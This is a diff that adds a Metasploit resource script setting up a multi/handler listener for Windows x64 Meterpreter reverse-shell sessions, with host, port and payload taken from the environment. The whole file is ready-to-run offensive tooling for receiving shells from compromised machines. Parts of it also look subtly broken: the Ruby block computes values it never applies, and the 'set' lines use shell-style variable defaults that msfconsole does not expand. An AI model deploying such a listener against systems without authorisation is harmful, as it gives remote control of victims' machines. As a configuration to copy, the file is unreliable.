@@ -1,0 +1,18 @@
+# Multi-handler listener for reverse shells
+# Usage: msfconsole -r listener.rc LHOST=<ip> LPORT=<port>
+
+<ruby>
+lhost = framework.datastore['LHOST'] || ENV['LHOST'] || '10.0.0.1'
+lport = framework.datastore['LPORT'] || ENV['LPORT'] || '4444'
+payload = framework.datastore['PAYLOAD'] || ENV['PAYLOAD'] || 'windows/x64/meterpreter/reverse_tcp'
+
+print_status("Listener: #{lhost}:#{lport}")
+print_status("Payload: #{payload}")
+</ruby>
+
+use exploit/multi/handler
+set PAYLOAD ${PAYLOAD:-windows/x64/meterpreter/reverse_tcp}
+set LHOST ${LHOST:-0.0.0.0}
+set LPORT ${LPORT:-4444}
+set ExitOnSession false
+exploit -j
